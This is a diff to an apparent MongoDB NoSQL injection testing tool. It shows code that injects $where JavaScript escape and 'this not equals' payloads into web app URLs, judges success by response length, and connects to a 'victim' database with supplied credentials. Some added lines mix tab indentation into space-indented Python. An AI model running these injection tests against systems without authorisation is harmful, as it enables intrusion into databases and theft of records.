@@ -97,6 +97,7 @@ def netAttacks():
     webOpen = False
     #This is a global for future use with other modules; may change
     global dbList
+    target = options.victim
 
     
     srvNeedCreds = raw_input("Does the database server need credentials? ")
@@ -114,7 +115,7 @@ def netAttacks():
     elif srvNeedCreds == "y" or srvNeedCreds == "Y":
         srvUser = raw_input("Enter server username: ")
         srvPass = raw_input("Enter server password: ")
-        uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
+        uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
 
         try:
             conn = pymongo.MongoClient(uri)
@@ -253,14 +254,15 @@ def webApps():
         else:
             print "Injected response was smaller than random response.  Injection may have worked but requires verification."
             possAddrs.append(neqUri)
+	print "\n"
 
-        print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+        print "Testing Mongo <2.4 $where all Javascript string escape attack for all records..."
         print "Injecting " + whereStrUri
 
         whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
         whereStrDelta = abs(whereStrLen - randLength)
 
-        if (whereStrDelta >= 100) and (whereStrLen > 0):
+        if (whereStrDelta >= 100) and (whereStrLen -randLength > 0):
             print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
             testResults[1] = True
             vulnAddrs.append(whereStrUri)
@@ -277,7 +279,7 @@ def webApps():
             possAddrs.append(whereStrUri)
 
         print "\n"
-        print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+        print "Testing Mongo <2.4 $where Javascript integer escape attack for all records..."
         print "Injecting " + whereIntUri
 
         whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
@@ -298,11 +300,11 @@ def webApps():
         else:
             print "Injected response was smaller than random response.  Injection may have worked but requires verification."
             possAddrs.append(whereIntUri)
-
+	print "\n"
         #Start a single record attack in case the app expects only one record back
 
-        print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
-        print " Injecting " + whereOneStr
+        print "Testing Mongo <2.4 $where all Javascript string escape attack for one record..."
+        print "Injecting " + whereOneStr
 
 
         whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
@@ -325,8 +327,8 @@ def webApps():
             possAddrs.append(whereOneStr)
 
         print "\n"
-        print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
-        print " Injecting " + whereOneInt
+        print "Testing Mongo <2.4 $where Javascript integer escape attack for one record..."
+        print "Injecting " + whereOneInt
 
 
         whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
@@ -349,7 +351,7 @@ def webApps():
 
         print "\n"
         print "Testing Mongo this not equals string escape attack for all records..."
-        print " Injecting " + strThisNeqUri
+        print "Injecting " + strThisNeqUri
 
         whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
         whereThisStrDelta = abs(whereThisStrLen - randLength)
@@ -372,7 +374,7 @@ def webApps():
 
         print "\n"
         print "Testing Mongo this not equals integer escape attack for all records..."
-        print " Injecting " + intThisNeqUri
+        print "Injecting " + intThisNeqUri
 
         whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
         whereThisIntDelta = abs(whereThisIntLen - randLength)
@@ -392,7 +394,7 @@ def webApps():
         else:
             print "Injected response was smaller than random response.  Injection may have worked but requires verification."
             possAddrs.append(intThisNeqUri)
-
+	print "\n"
 
         doTimeAttack = raw_input("Start timing based tests?")
 
